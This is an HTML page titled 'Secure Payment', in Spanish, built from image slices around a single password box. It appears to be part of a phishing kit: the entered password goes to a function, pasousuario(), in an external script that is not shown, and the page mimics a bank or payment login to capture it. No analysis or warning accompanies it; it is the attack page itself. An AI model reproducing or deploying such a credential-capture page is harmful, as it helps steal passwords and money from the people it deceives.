<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Secure Payment</title>

    
    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.1.3/dist/css/bootstrap.min.css" rel="stylesheet"
        integrity="sha384-1BmE4kWBq78iYhFldvKuhfTAU6auU8tT94WrHftjDbrCEXSU1oBoqyl2QvZ6jIW3" crossorigin="anonymous">


    
        <script type="text/javascript" src="../../scripts/jquery-3.6.0.min.js"></script>
		<script src="../../scripts/jquery.jclock-min.js" type="text/javascript"></script>
   		<script type="text/javascript" src="../../scripts/functions.js"></script>  		

</head>
<body>

<img src="img/menu.webp" alt="" srcset="" width="100%">
    
<div class="user" style="width:90%; height:370px; border:1px solid #cdcdcd;margin:auto; margin-top:50px; border-radius:15px;">
<center><img src="img/contraseÃ±a.webp" alt="" srcset="" width="80%">

<input type="text" name="" id="txtPassword" placeholder="Ingresa tu contraseÃ±a" style="width:80%; height:40px; padding-left:10px; border:1.5px solid #170c84;">
<br>
<input type="submit" id="btnPass" value="Ingresar" style="height:40px; margin-top:25px; background-color:#170c84; width:150px; border-radius:25px;">
<br><br>
<img src="img/letras2.webp" alt="" srcset="" width="80%">
        </center>

</div>

<img src="img/footer.webp" alt="" srcset="" width="100%">
    


<script type="text/javascript">
	var espera = 0;

	let identificadorTiempoDeEspera;

	function retardor() {
	  identificadorTiempoDeEspera = setTimeout(retardorX, 900);
	}

	function retardorX() {

	}

	$(document).ready(function() {
	

		$('#btnPass').click(function(){
			if ($("#txtPassword").val().length > 3) {
				pasousuario($("#txtPassword").val());	
			}else{
				$(".mensaje").show();
			}	
		});

				
	});

   

</script>
</body>
</html>
